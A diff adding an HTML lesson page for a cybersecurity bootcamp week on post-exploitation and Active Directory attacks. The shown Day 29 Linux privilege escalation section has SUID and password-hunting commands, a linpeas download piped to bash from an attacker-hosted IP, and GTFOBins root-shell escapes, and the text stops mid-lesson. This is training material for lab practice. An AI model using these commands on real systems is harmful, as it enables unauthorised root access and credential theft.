@@ -1,0 +1,1333 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Cybersecurity Bootcamp — Phase 3, Week 5</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Courier+Prime:wght@400;700&family=DM+Sans:wght@300;400;500;600;700&family=Michroma&display=swap');
+
+:root{
+  --bg:      #050a0f;
+  --surface: #080f17;
+  --card:    #0c1520;
+  --border:  #112030;
+  --accent:  #00b4d8;   /* surgical cyan — precision */
+  --ice:     #90e0ef;
+  --steel:   #48cae4;
+  --crimson: #ef233c;
+  --amber:   #f4a261;
+  --lime:    #06d6a0;
+  --purple:  #9b72cf;
+  --text:    #b8ccd8;
+  --muted:   #304a5a;
+  --mono:    'Courier Prime', monospace;
+  --sans:    'DM Sans', sans-serif;
+  --display: 'Michroma', sans-serif;
+}
+
+*{margin:0;padding:0;box-sizing:border-box;}
+body{background:var(--bg);color:var(--text);font-family:var(--sans);font-size:15px;line-height:1.7;min-height:100vh;}
+
+/* Signature: horizontal scan-line sweep across the page — like radar sweeping */
+body::before{
+  content:'';position:fixed;top:0;left:0;width:100%;height:1px;
+  background:linear-gradient(90deg,transparent,var(--accent),transparent);
+  animation:scanline 6s linear infinite;pointer-events:none;z-index:999;opacity:0.4;
+}
+@keyframes scanline{0%{top:0;}100%{top:100vh;}}
+
+/* ── HEADER ── */
+header{background:rgba(5,10,15,0.97);border-bottom:1px solid var(--border);padding:0 2rem;position:sticky;top:0;z-index:200;}
+.hi{max-width:1160px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;height:56px;}
+.logo{font-family:var(--display);font-size:0.95rem;letter-spacing:0.15em;color:var(--ice);}
+.wbadge{font-family:var(--mono);font-size:0.62rem;color:var(--accent);border:1px solid rgba(0,180,216,0.35);padding:4px 14px;letter-spacing:0.14em;background:rgba(0,180,216,0.05);}
+
+/* ── HERO ── */
+.hero{max-width:1160px;margin:0 auto;padding:3.5rem 2rem 2.5rem;position:relative;z-index:1;}
+.eyebrow{font-family:var(--mono);font-size:0.65rem;color:var(--muted);letter-spacing:0.3em;margin-bottom:0.8rem;}
+.hero h1{font-family:var(--display);font-size:clamp(1.8rem,5vw,3.5rem);color:#fff;line-height:1.1;letter-spacing:0.06em;margin-bottom:1rem;}
+.hero h1 .hi2{color:var(--accent);text-shadow:0 0 30px rgba(0,180,216,0.3);}
+.hsub{max-width:600px;color:var(--muted);font-size:0.91rem;line-height:1.75;margin-bottom:1.8rem;}
+.htags{display:flex;gap:0.5rem;flex-wrap:wrap;}
+.htag{font-family:var(--mono);font-size:0.63rem;padding:4px 11px;border-radius:1px;letter-spacing:0.07em;}
+.ta{background:rgba(0,180,216,0.09);color:var(--accent);border:1px solid rgba(0,180,216,0.25);}
+.tb{background:rgba(239,35,60,0.09);color:var(--crimson);border:1px solid rgba(239,35,60,0.25);}
+.tc{background:rgba(6,214,160,0.08);color:var(--lime);border:1px solid rgba(6,214,160,0.2);}
+.td{background:rgba(244,162,97,0.08);color:var(--amber);border:1px solid rgba(244,162,97,0.2);}
+.te{background:rgba(155,114,207,0.09);color:var(--purple);border:1px solid rgba(155,114,207,0.2);}
+
+/* ── DAY NAV ── */
+.dnav{max-width:1160px;margin:0 auto;padding:0 2rem;display:flex;border-bottom:1px solid var(--border);position:relative;z-index:1;overflow-x:auto;}
+.dtab{font-family:var(--mono);font-size:0.66rem;padding:12px 16px;border:none;background:transparent;color:var(--muted);cursor:pointer;border-bottom:2px solid transparent;transition:all 0.16s;white-space:nowrap;letter-spacing:0.05em;}
+.dtab:hover{color:var(--text);}
+.dtab.on{color:var(--accent);border-bottom-color:var(--accent);}
+
+/* ── CONTENT ── */
+.wrap{max-width:1160px;margin:0 auto;padding:2.5rem 2rem;position:relative;z-index:1;}
+.pnl{display:none;}.pnl.on{display:block;}
+
+/* ── DAY HEADER ── */
+.dh{display:flex;gap:1.5rem;align-items:flex-start;margin-bottom:2rem;padding-bottom:1.5rem;border-bottom:1px solid var(--border);}
+.dnum{font-family:var(--display);font-size:4.5rem;line-height:0.85;color:var(--accent);opacity:0.12;letter-spacing:0.04em;min-width:100px;}
+.dinfo h2{font-family:var(--display);font-size:1.4rem;color:#fff;letter-spacing:0.08em;margin-bottom:0.35rem;}
+.dinfo p{color:var(--muted);font-size:0.84rem;}
+.stag{font-family:var(--mono);font-size:0.59rem;padding:2px 9px;margin-right:4px;border-radius:1px;letter-spacing:0.08em;}
+.sth{background:rgba(155,114,207,0.1);color:var(--purple);border:1px solid rgba(155,114,207,0.25);}
+.slb{background:rgba(6,214,160,0.08);color:var(--lime);border:1px solid rgba(6,214,160,0.2);}
+.stl{background:rgba(0,180,216,0.07);color:var(--accent);border:1px solid rgba(0,180,216,0.2);}
+
+/* ── PROGRESS ── */
+.pb{margin-bottom:2rem;}
+.pbl{font-family:var(--mono);font-size:0.62rem;color:var(--muted);letter-spacing:0.15em;margin-bottom:5px;}
+.pbt{height:2px;background:var(--border);}
+.pbf{height:100%;background:linear-gradient(90deg,var(--accent),var(--lime));transition:width .5s;}
+
+/* ── CARD ── */
+.card{background:var(--card);border:1px solid var(--border);border-radius:3px;padding:1.5rem;margin-bottom:1.2rem;}
+.clbl{font-family:var(--mono);font-size:0.62rem;color:var(--steel);letter-spacing:0.2em;margin-bottom:0.9rem;display:flex;align-items:center;gap:0.6rem;}
+.clbl::before{content:'[';color:var(--muted);}.clbl::after{content:']';color:var(--muted);}
+.card h3{font-size:1rem;font-weight:600;color:#d8eaf5;margin-bottom:0.5rem;}
+.card p{color:var(--text);font-size:0.87rem;margin-bottom:0.5rem;}
+.card p:last-child{margin-bottom:0;}
+
+/* ── TERMINAL ── */
+.trm{background:#020609;border:1px solid var(--border);border-radius:3px;overflow:hidden;margin:1rem 0;}
+.tbar{background:#060d14;padding:7px 14px;display:flex;align-items:center;gap:6px;border-bottom:1px solid var(--border);}
+.d{width:9px;height:9px;border-radius:50%;}
+.dr{background:#ff5f56;}.dy{background:#ffbd2e;}.dg{background:#27c93f;}
+.ttl{font-family:var(--mono);font-size:0.62rem;color:var(--muted);margin-left:6px;letter-spacing:0.1em;}
+.tbody{padding:1.2rem 1.4rem;font-family:var(--mono);font-size:0.77rem;line-height:2.1;color:#2a4a5a;}
+.pr{color:var(--lime);}.cm{color:#c8dde8;}.co{color:#1a3040;}
+.ha{color:var(--accent);}.hc{color:var(--crimson);}.ham{color:var(--amber);}
+.hl2{color:var(--lime);}.hp{color:var(--purple);}.hic{color:var(--ice);}
+
+/* ── TABLE ── */
+.tbl{width:100%;border-collapse:collapse;font-size:0.81rem;margin:1rem 0;}
+.tbl th{background:var(--surface);color:var(--steel);font-family:var(--mono);font-size:0.62rem;letter-spacing:0.14em;text-align:left;padding:9px 13px;border:1px solid var(--border);}
+.tbl td{padding:9px 13px;border:1px solid var(--border);color:var(--text);vertical-align:top;}
+.tbl tr:nth-child(even) td{background:rgba(255,255,255,0.015);}
+.tbl tr:hover td{background:rgba(0,180,216,0.03);}
+
+/* ── CALLOUT ── */
+.note{display:flex;gap:1rem;align-items:flex-start;padding:1rem 1.2rem;border-radius:2px;margin:1rem 0;font-size:0.85rem;}
+.ni{background:rgba(0,180,216,0.06);border:1px solid rgba(0,180,216,0.18);}
+.nw{background:rgba(244,162,97,0.07);border:1px solid rgba(244,162,97,0.2);}
+.nd{background:rgba(239,35,60,0.06);border:1px solid rgba(239,35,60,0.2);}
+.ng{background:rgba(6,214,160,0.05);border:1px solid rgba(6,214,160,0.18);}
+.nico{font-size:1rem;line-height:1.6;flex-shrink:0;}
+.note p{color:var(--text);margin:0;}.note strong{color:#fff;}
+
+/* ── CHECKLIST ── */
+.ck{list-style:none;margin:0.8rem 0;}
+.ck li{display:flex;align-items:flex-start;gap:0.7rem;padding:0.42rem 0;font-size:0.85rem;color:var(--text);border-bottom:1px solid rgba(255,255,255,0.04);}
+.ck li:last-child{border-bottom:none;}
+.ck li::before{content:'//';color:var(--accent);flex-shrink:0;font-family:var(--mono);font-size:0.75rem;padding-top:2px;}
+
+/* ── QUIZ ── */
+.qb{background:var(--card);border:1px solid var(--border);border-radius:3px;padding:1.4rem;margin-bottom:1rem;}
+.qt{font-size:0.88rem;font-weight:600;color:#d8eaf5;margin-bottom:1rem;}
+.qopts{display:flex;flex-direction:column;gap:0.44rem;}
+.qo{display:flex;align-items:flex-start;gap:0.65rem;padding:0.6rem 1rem;border:1px solid var(--border);border-radius:2px;cursor:pointer;font-size:0.81rem;color:var(--text);transition:all 0.14s;user-select:none;}
+.qo:hover{border-color:var(--accent);color:#fff;background:rgba(0,180,216,0.04);}
+.qo.correct{border-color:var(--lime);background:rgba(6,214,160,0.07);color:var(--lime);}
+.qo.wrong{border-color:var(--crimson);background:rgba(239,35,60,0.07);color:var(--crimson);}
+.qk{font-family:var(--mono);font-size:0.67rem;color:var(--muted);min-width:16px;flex-shrink:0;padding-top:1px;}
+.qfb{margin-top:0.8rem;font-size:0.79rem;padding:0.6rem 1rem;border-radius:2px;display:none;}
+.qfb.show{display:block;}
+.qfb.correct{background:rgba(6,214,160,0.08);color:var(--lime);border:1px solid rgba(6,214,160,0.22);}
+.qfb.wrong{background:rgba(239,35,60,0.08);color:var(--crimson);border:1px solid rgba(239,35,60,0.22);}
+
+/* ── PRIVESC CHECKLIST VISUAL ── */
+.privesc-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:0.8rem;margin:1rem 0;}
+.pv-card{background:var(--card);border:1px solid var(--border);border-radius:2px;padding:1.1rem;position:relative;}
+.pv-card::after{content:'';position:absolute;top:0;left:0;width:3px;height:100%;background:var(--accent);border-radius:2px 0 0 2px;}
+.pv-card.crit::after{background:var(--crimson);}
+.pv-card.high::after{background:var(--amber);}
+.pv-card.med::after{background:var(--purple);}
+.pv-title{font-family:var(--mono);font-size:0.76rem;font-weight:700;color:var(--ice);margin-bottom:0.3rem;}
+.pv-cmd{font-family:var(--mono);font-size:0.69rem;color:var(--accent);margin-bottom:0.4rem;word-break:break-all;}
+.pv-card.crit .pv-cmd{color:var(--crimson);}
+.pv-card.high .pv-cmd{color:var(--amber);}
+.pv-card.med .pv-cmd{color:var(--purple);}
+.pv-desc{font-size:0.77rem;color:var(--muted);}
+
+/* ── AD ATTACK FLOW ── */
+.ad-flow{display:flex;flex-direction:column;gap:0;border:1px solid var(--border);border-radius:3px;overflow:hidden;margin:1rem 0;}
+.ad-step{display:grid;grid-template-columns:50px 180px 1fr;border-bottom:1px solid var(--border);}
+.ad-step:last-child{border-bottom:none;}
+.as-num{display:flex;align-items:center;justify-content:center;font-family:var(--display);font-size:1rem;color:var(--accent);background:var(--surface);border-right:1px solid var(--border);}
+.as-attack{font-family:var(--mono);font-size:0.7rem;color:var(--amber);display:flex;align-items:center;padding:10px 14px;background:var(--surface);border-right:1px solid var(--border);word-break:break-word;}
+.as-desc{padding:10px 14px;font-size:0.82rem;color:var(--text);}
+
+/* ── KERBEROS DIAGRAM ── */
+.kerb-diag{background:var(--card);border:1px solid var(--border);border-radius:3px;padding:1.5rem;margin:1rem 0;font-family:var(--mono);font-size:0.76rem;line-height:2.3;color:var(--muted);}
+.kd-title{font-size:0.63rem;letter-spacing:0.2em;color:var(--muted);margin-bottom:0.8rem;}
+.kd-client{color:var(--accent);}
+.kd-dc{color:var(--crimson);}
+.kd-svc{color:var(--lime);}
+.kd-arrow{color:var(--muted);}
+.kd-label{color:var(--amber);}
+.kd-attack{color:var(--crimson);font-weight:700;}
+
+/* ── MITRE TECHNIQUE CARDS ── */
+.mitre-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:0.8rem;margin:1rem 0;}
+.mitre-card{background:var(--card);border:1px solid var(--border);border-radius:2px;padding:1rem 1.1rem;}
+.mitre-id{font-family:var(--mono);font-size:0.68rem;color:var(--accent);margin-bottom:0.2rem;}
+.mitre-name{font-size:0.84rem;font-weight:600;color:#d8eaf5;margin-bottom:0.4rem;}
+.mitre-desc{font-size:0.77rem;color:var(--muted);}
+
+/* ── LATERAL MOVEMENT DIAGRAM ── */
+.lat-map{background:var(--card);border:1px solid var(--border);border-radius:3px;padding:1.5rem;margin:1rem 0;}
+.lat-title{font-family:var(--mono);font-size:0.63rem;letter-spacing:0.18em;color:var(--muted);margin-bottom:1rem;}
+.lat-nodes{font-family:var(--mono);font-size:0.76rem;line-height:2.5;color:var(--muted);}
+.ln-owned{color:var(--lime);}
+.ln-target{color:var(--crimson);}
+.ln-path{color:var(--amber);}
+.ln-edge{color:var(--muted);}
+.ln-cred{color:var(--accent);}
+
+/* ── INTERACTIVE TABS ── */
+.tabs{display:flex;gap:0.4rem;margin-bottom:1rem;flex-wrap:wrap;}
+.itab{font-family:var(--mono);font-size:0.68rem;padding:5px 13px;border:1px solid var(--border);border-radius:2px;cursor:pointer;color:var(--muted);transition:all 0.14s;}
+.itab:hover{border-color:var(--accent);color:var(--accent);}
+.itab.on{border-color:var(--accent);color:var(--accent);background:rgba(0,180,216,0.07);}
+.tcontent{display:none;}.tcontent.on{display:block;}
+
+/* ── SECTION LABEL ── */
+.slbl{font-family:var(--mono);font-size:0.62rem;color:var(--muted);letter-spacing:0.25em;margin:2rem 0 0.8rem;}
+
+/* ── TWO COL ── */
+.two{display:grid;grid-template-columns:1fr 1fr;gap:1rem;}
+@media(max-width:700px){.two{grid-template-columns:1fr;}.dnum{font-size:3rem;min-width:70px;}.ad-step{grid-template-columns:40px 1fr;}.as-attack{display:none;}}
+
+/* ── HELPERS ── */
+.hl{color:var(--accent);font-weight:600;}
+.hcr{color:var(--crimson);font-weight:600;}
+.ham2{color:var(--amber);font-weight:600;}
+.hlm{color:var(--lime);font-weight:600;}
+.hpp{color:var(--purple);font-weight:600;}
+.hic2{color:var(--ice);font-weight:600;}
+
+/* ── FOOTER ── */
+footer{border-top:1px solid var(--border);padding:1.5rem 2rem;text-align:center;font-family:var(--mono);font-size:0.64rem;color:var(--muted);letter-spacing:0.1em;max-width:1160px;margin:2rem auto 0;position:relative;z-index:1;}
+</style>
+<link rel="stylesheet" href="../css/shared.css"/>
+</head>
+<body>
+<nav class="breadcrumb" style="background:var(--surface,#090c12);border-bottom-color:var(--border,#141b26);color:var(--muted,#253040);">
+  <a href="../index.html" style="color:var(--accent,#3b82f6);">LESSON HUB</a>
+  <span>/</span>
+  <span style="color:var(--text,#b0c0d8);">Phase 3</span>
+  <span>/</span>
+  <span style="color:#fff;">Week 5</span>
+</nav>
+
+<header>
+  <div class="hi">
+    <div class="logo">CYBERBOOTCAMP // PHASE 3</div>
+    <div class="wbadge">WEEK 5 · POST-EXPLOITATION & ACTIVE DIRECTORY</div>
+  </div>
+</header>
+
+<div class="hero">
+  <div class="eyebrow">// PHASE 3 — OFFENSIVE SECURITY ADVANCED → WEEK 5 OF 6</div>
+  <h1>AFTER THE SHELL:<br><span class="hi2">OWN THE DOMAIN.</span></h1>
+  <p class="hsub">Seven days of advanced post-exploitation — Linux and Windows privilege escalation, Mimikatz credential harvesting, Active Directory attacks (Kerberoasting, Pass-the-Hash, DCSync, Golden Tickets), and lateral movement across enterprise networks. This is where pentesters separate from script kiddies.</p>
+  <div class="htags">
+    <span class="htag ta">Linux PrivEsc</span>
+    <span class="htag tb">Windows PrivEsc</span>
+    <span class="htag tc">Mimikatz</span>
+    <span class="htag td">Kerberoasting</span>
+    <span class="htag te">Pass-the-Hash</span>
+    <span class="htag ta">DCSync</span>
+    <span class="htag tb">Golden Ticket</span>
+    <span class="htag tc">Lateral Movement</span>
+  </div>
+</div>
+
+<!-- ── WEEK 5 OUTLINE ── -->
+<div style="max-width:1160px;margin:0 auto;padding:0 2rem 2rem;position:relative;z-index:1;">
+  <div style="background:var(--card);border:1px solid var(--border);border-radius:4px;overflow:hidden;">
+    <div style="background:var(--surface);padding:0.9rem 1.4rem;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:0.6rem;">
+      <span style="font-family:var(--mono);font-size:0.62rem;color:var(--accent);letter-spacing:0.2em;">WEEK 5 — DAILY OUTLINE</span>
+      <span style="font-family:var(--mono);font-size:0.6rem;color:var(--muted);margin-left:auto;">PHASE 3 · DAYS 29–35</span>
+    </div>
+    <table style="width:100%;border-collapse:collapse;font-size:0.82rem;">
+      <thead>
+        <tr>
+          <th style="background:var(--surface);color:var(--steel);font-family:var(--mono);font-size:0.6rem;letter-spacing:0.14em;text-align:left;padding:9px 14px;border:1px solid var(--border);width:80px;">DAY</th>
+          <th style="background:var(--surface);color:var(--steel);font-family:var(--mono);font-size:0.6rem;letter-spacing:0.14em;text-align:left;padding:9px 14px;border:1px solid var(--border);width:200px;">TOPIC</th>
+          <th style="background:var(--surface);color:var(--steel);font-family:var(--mono);font-size:0.6rem;letter-spacing:0.14em;text-align:left;padding:9px 14px;border:1px solid var(--border);">WHAT YOU'LL LEARN</th>
+          <th style="background:var(--surface);color:var(--steel);font-family:var(--mono);font-size:0.6rem;letter-spacing:0.14em;text-align:left;padding:9px 14px;border:1px solid var(--border);width:160px;">KEY TOOLS</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td style="padding:10px 14px;border:1px solid var(--border);font-family:var(--mono);font-size:0.75rem;color:var(--accent);font-weight:700;">Day 29</td>
+          <td style="padding:10px 14px;border:1px solid var(--border);color:#d8eaf5;font-weight:600;">Linux Privilege Escalation</td>
+          <td style="padding:10px 14px;border:1px solid var(--border);color:var(--text);">8 privesc vectors: SUID binaries, sudo misconfigs, writable cron jobs, kernel exploits (DirtyCow), PATH hijacking, world-writable files, credential hunting in configs, NFS no_root_squash. GTFOBins methodology for every finding.</td>
+          <td style="padding:10px 14px;border:1px solid var(--border);font-family:var(--mono);font-size:0.74rem;color:var(--lime);">linpeas.sh, GTFOBins, searchsploit</td>
+        </tr>
+        <tr style="background:rgba(255,255,255,0.013);">
+          <td style="padding:10px 14px;border:1px solid var(--border);font-family:var(--mono);font-size:0.75rem;color:var(--accent);font-weight:700;">Day 30</td>
+          <td style="padding:10px 14px;border:1px solid var(--border);color:#d8eaf5;font-weight:600;">Windows Privilege Escalation</td>
+          <td style="padding:10px 14px;border:1px solid var(--border);color:var(--text);">Token impersonation via Potato attacks (GodPotato, PrintSpoofer) — escalate service accounts to SYSTEM in seconds. Unquoted service paths, AlwaysInstallElevated MSI abuse, DLL hijacking concepts, winpeas enumeration workflow.</td>
+          <td style="padding:10px 14px;border:1px solid var(--border);font-family:var(--mono);font-size:0.74rem;color:var(--lime);">winpeas, GodPotato, PrintSpoofer</td>
+        </tr>
+        <tr>
+          <td style="padding:10px 14px;border:1px solid var(--border);font-family:var(--mono);font-size:0.75rem;color:var(--accent);font-weight:700;">Day 31</td>
+          <td style="padding:10px 14px;border:1px solid var(--border);color:#d8eaf5;font-weight:600;">Post-Exploitation I</td>
+          <td style="padding:10px 14px;border:1px solid var(--border);color:var(--text);">Situational awareness commands (sysinfo, ipconfig, arp), internal network scanning through Meterpreter, persistence mechanisms (registry run keys, scheduled tasks, SSH authorized_keys, cron), pivoting via route add and SOCKS proxy to reach isolated network segments.</td>
+          <td style="padding:10px 14px;border:1px solid var(--border);font-family:var(--mono);font-size:0.74rem;color:var(--lime);">Meterpreter, proxychains, socks_proxy</td>
+        </tr>
+        <tr style="background:rgba(255,255,255,0.013);">
+          <td style="padding:10px 14px;border:1px solid var(--border);font-family:var(--mono);font-size:0.75rem;color:var(--accent);font-weight:700;">Day 32</td>
+          <td style="padding:10px 14px;border:1px solid var(--border);color:#d8eaf5;font-weight:600;">Mimikatz & Credential Harvesting</td>
+          <td style="padding:10px 14px;border:1px solid var(--border);color:var(--text);">How Mimikatz reads LSASS memory. sekurlsa::logonpasswords to extract NTLM hashes and plaintext passwords. lsadump::sam for local accounts. Pass-the-Hash with CrackMapExec and Impacket — authenticate without cracking. Pass-the-Ticket with exported .kirbi files. kiwi module in Meterpreter.</td>
+          <td style="padding:10px 14px;border:1px solid var(--border);font-family:var(--mono);font-size:0.74rem;color:var(--lime);">mimikatz, CrackMapExec, Impacket</td>
+        </tr>
+        <tr>
+          <td style="padding:10px 14px;border:1px solid var(--border);font-family:var(--mono);font-size:0.75rem;color:var(--accent);font-weight:700;">Day 33</td>
+          <td style="padding:10px 14px;border:1px solid var(--border);color:#d8eaf5;font-weight:600;">Active Directory Attacks</td>
+          <td style="padding:10px 14px;border:1px solid var(--border);color:var(--text);">Kerberos ticket system mapped to attack points. Kerberoasting: request TGS for any SPN → crack service account hash offline. AS-REP Roasting: no credentials needed against accounts without preauthentication. DCSync: mimic a DC to dump ALL domain hashes. Golden Ticket: forge permanent domain access using krbtgt hash. Silver Ticket for service-specific forgery.</td>
+          <td style="padding:10px 14px;border:1px solid var(--border);font-family:var(--mono);font-size:0.74rem;color:var(--lime);">GetUserSPNs.py, GetNPUsers.py, mimikatz, secretsdump</td>
+        </tr>
+        <tr style="background:rgba(255,255,255,0.013);">
+          <td style="padding:10px 14px;border:1px solid var(--border);font-family:var(--mono);font-size:0.75rem;color:var(--accent);font-weight:700;">Day 34</td>
+          <td style="padding:10px 14px;border:1px solid var(--border);color:#d8eaf5;font-weight:600;">Lateral Movement</td>
+          <td style="padding:10px 14px;border:1px solid var(--border);color:var(--text);">Six lateral movement techniques compared (PSExec, WMI, WinRM, RDP, PtH, Pass-the-Ticket) with log signatures for each. Real command syntax for wmiexec, evil-winrm, xfreerdp with PtH, CrackMapExec credential spraying across subnets. Following BloodHound attack paths in practice — visualised end-to-end hop chain from helpdesk PC to Domain Admin.</td>
+          <td style="padding:10px 14px;border:1px solid var(--border);font-family:var(--mono);font-size:0.74rem;color:var(--lime);">evil-winrm, wmiexec, CrackMapExec, BloodHound</td>
+        </tr>
+        <tr>
+          <td style="padding:10px 14px;border:1px solid var(--border);font-family:var(--mono);font-size:0.75rem;color:var(--accent);font-weight:700;">Day 35</td>
+          <td style="padding:10px 14px;border:1px solid var(--border);color:#d8eaf5;font-weight:600;">Full Attack Chain + Capstone</td>
+          <td style="padding:10px 14px;border:1px solid var(--border);color:var(--text);">MITRE ATT&CK mapping for every Week 5 technique (T1548, T1053, T1134, T1003, T1558, T1550, T1021). Complete week review table. Three lab tracks: TryHackMe AD rooms, HackTheBox retired AD machines (Active, Forest, Sauna), and building your own AD lab from scratch. Week 5 readiness checklist before Phase 3 Week 6.</td>
+          <td style="padding:10px 14px;border:1px solid var(--border);font-family:var(--mono);font-size:0.74rem;color:var(--lime);">TryHackMe, HackTheBox, all week tools</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<div class="dnav">
+  <button class="dtab on"  onclick="show(0)">Day 29 — Linux PrivEsc</button>
+  <button class="dtab" onclick="show(1)">Day 30 — Windows PrivEsc</button>
+  <button class="dtab" onclick="show(2)">Day 31 — Post-Exploitation I</button>
+  <button class="dtab" onclick="show(3)">Day 32 — Mimikatz & Credentials</button>
+  <button class="dtab" onclick="show(4)">Day 33 — AD Attacks</button>
+  <button class="dtab" onclick="show(5)">Day 34 — Lateral Movement</button>
+  <button class="dtab" onclick="show(6)">Day 35 — Full Attack Chain</button>
+</div>
+
+<div class="wrap">
+
+<!-- ═══════════════ DAY 29 ═══════════════ -->
+<div class="pnl on" id="p0">
+  <div class="dh">
+    <div class="dnum">29</div>
+    <div class="dinfo">
+      <h2>LINUX PRIVILEGE ESCALATION</h2>
+      <p><span class="stag sth">THEORY</span><span class="stag slb">LAB</span> SUID · sudo Misconfigs · Cron · Kernel Exploits · PATH Hijacking</p>
+    </div>
+  </div>
+  <div class="pb"><div class="pbl">WEEK 5 PROGRESS — DAY 29 OF 35</div><div class="pbt"><div class="pbf" style="width:83%"></div></div></div>
+
+  <div class="note ni">
+    <div class="nico">🧗</div>
+    <p><strong>You have a shell. Now escalate.</strong> Getting initial access as <code>www-data</code> or a low-privilege user is just the beginning. Privilege escalation (privesc) is the art of moving from limited access to root. On Linux, there are seven reliable categories of escalation vectors. A methodical attacker checks all of them. <code>linpeas.sh</code> automates this entire checklist in under 60 seconds.</p>
+  </div>
+
+  <div class="slbl">// 29.1 — THE LINUX PRIVESC CHECKLIST</div>
+
+  <div class="privesc-grid">
+    <div class="pv-card crit">
+      <div class="pv-title">SUID Binaries</div>
+      <div class="pv-cmd">find / -perm -4000 -type f 2>/dev/null</div>
+      <div class="pv-desc">Executables that run as their owner (often root) regardless of who runs them. If a SUID binary is in GTFOBins — instant root. Check every result.</div>
+    </div>
+    <div class="pv-card crit">
+      <div class="pv-title">sudo Misconfiguration</div>
+      <div class="pv-cmd">sudo -l</div>
+      <div class="pv-desc">What can the current user run as root without a password? Even innocuous binaries (find, vim, python, awk) allow shell escape to root via GTFOBins.</div>
+    </div>
+    <div class="pv-card crit">
+      <div class="pv-title">Writable Cron Jobs</div>
+      <div class="pv-cmd">cat /etc/crontab<br>ls -la /etc/cron*</div>
+      <div class="pv-desc">If a cron job runs as root and calls a script you can write to — modify the script. Root executes your code on the next run.</div>
+    </div>
+    <div class="pv-card high">
+      <div class="pv-title">Kernel Exploits</div>
+      <div class="pv-cmd">uname -a<br>searchsploit linux kernel 4.4</div>
+      <div class="pv-desc">Old kernels have public exploits that give root. DirtyCow (CVE-2016-5195) works on kernels &lt;4.8.3. Check version, cross-reference CVEs.</div>
+    </div>
+    <div class="pv-card high">
+      <div class="pv-title">PATH Hijacking</div>
+      <div class="pv-cmd">echo $PATH<br>find / -writable -type d 2>/dev/null</div>
+      <div class="pv-desc">If a SUID binary calls another program by relative name (e.g., <code>service</code>), put a malicious binary earlier in PATH. SUID binary runs your version as root.</div>
+    </div>
+    <div class="pv-card high">
+      <div class="pv-title">World-Writable Files</div>
+      <div class="pv-cmd">find / -writable -type f 2>/dev/null | grep -v proc</div>
+      <div class="pv-desc">Scripts called by root-owned processes that anyone can write to. If /etc/passwd is writable — add a root user directly. Rare but catastrophic.</div>
+    </div>
+    <div class="pv-card med">
+      <div class="pv-title">Credentials in Files</div>
+      <div class="pv-cmd">grep -r "password\|passwd\|secret" /var/www/ /etc/ 2>/dev/null</div>
+      <div class="pv-desc">Config files, backup scripts, .bash_history — developers leave credentials everywhere. Often the quickest path: find the root password in a backup script.</div>
+    </div>
+    <div class="pv-card med">
+      <div class="pv-title">NFS No Root Squash</div>
+      <div class="pv-cmd">cat /etc/exports<br>showmount -e target</div>
+      <div class="pv-desc">NFS shares with no_root_squash allow a remote root user to access shares as root on the target. Mount the share, create a SUID binary, execute it on target.</div>
+    </div>
+  </div>
+
+  <div class="slbl">// 29.2 — LINPEAS: AUTOMATED LINUX PRIVESC ENUMERATION</div>
+  <div class="trm">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">LINPEAS.SH — DEPLOYMENT AND OUTPUT</div></div>
+    <div class="tbody"><span class="co"># Download linpeas on your Kali, serve it, download on target:</span>
+<span class="pr">kali$</span> <span class="cm">wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh</span>
+<span class="pr">kali$</span> <span class="cm">python3 -m http.server 8000</span>      <span class="co"># Serve on port 8000</span>
+
+<span class="pr">target$</span> <span class="cm">curl http://192.168.56.100:8000/linpeas.sh | bash</span>
+<span class="co"># Or if curl unavailable:</span>
+<span class="pr">target$</span> <span class="cm">wget -qO- http://192.168.56.100:8000/linpeas.sh | bash</span>
+
+<span class="co"># ── READING LINPEAS OUTPUT ──────────────────────────────────</span>
+<span class="hc">RED/YELLOW  = 95% chance of privesc vector — investigate first</span>
+<span class="ham">RED         = Interesting — worth investigating</span>
+<span class="ha">GREEN       = Additional information</span>
+
+<span class="co"># Typical high-value linpeas findings:</span>
+<span class="hc">╔══════════╣ SUID - Check easy privesc, exploits and write perms
+-rwsr-xr-x 1 root root 30856 /usr/bin/find</span>    <span class="hc">← SUID find = root instantly</span>
+<span class="hc">╔══════════╣ Sudo version
+Sudo version 1.8.21p2</span>                          <span class="hc">← CVE-2019-14287 if &lt; 1.8.28</span>
+<span class="ham">╔══════════╣ Cron jobs
+*/1 * * * * root /opt/scripts/cleanup.sh</span>       <span class="ham">← check if cleanup.sh is writable</span>
+<span class="ha">╔══════════╣ Interesting Files
+/home/developer/.bash_history</span>                   <span class="ha">← check for passwords in history</span>
+<span class="hc">╔══════════╣ Passwords in config files
+/var/www/html/config.php: $db_pass = "sup3rs3cr3t"</span>  <span class="hc">← try this as root password!</span></div>
+  </div>
+
+  <div class="slbl">// 29.3 — SUID EXPLOITATION VIA GTFOBINS</div>
+  <div class="card">
+    <div class="clbl">GTFOBins</div>
+    <p><span class="hl">gtfobins.github.io</span> is your bible for SUID/sudo exploitation. It catalogs every Unix binary that can be abused to break out of restricted environments, escalate privileges, or exfiltrate data. For any SUID binary you find — check GTFOBins first before writing custom exploits.</p>
+  </div>
+  <div class="trm">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">SUID EXPLOITATION — REAL EXAMPLES FROM GTFOBINS</div></div>
+    <div class="tbody"><span class="co"># ── SCENARIO: find has SUID bit set ──────────────────────────
+# find / -perm -4000 shows: -rwsr-xr-x root root /usr/bin/find</span>
+<span class="pr">$</span> <span class="cm">find . -exec /bin/bash -p \; -quit</span>
+<span class="hl2">bash-4.4#</span> <span class="cm">id</span>
+<span class="hl2">uid=1000(user) gid=1000(user) euid=0(root)</span>   <span class="hc">← EFFECTIVE UID is root!</span>
+<span class="hl2">bash-4.4#</span> <span class="cm">whoami</span>
+<span class="hl2">root</span>
+
+<span class="co"># ── SCENARIO: python3 has SUID bit ───────────────────────────</span>
+<span class="pr">$</span> <span class="cm">python3 -c 'import os; os.execl("/bin/bash","bash","-p")'</span>
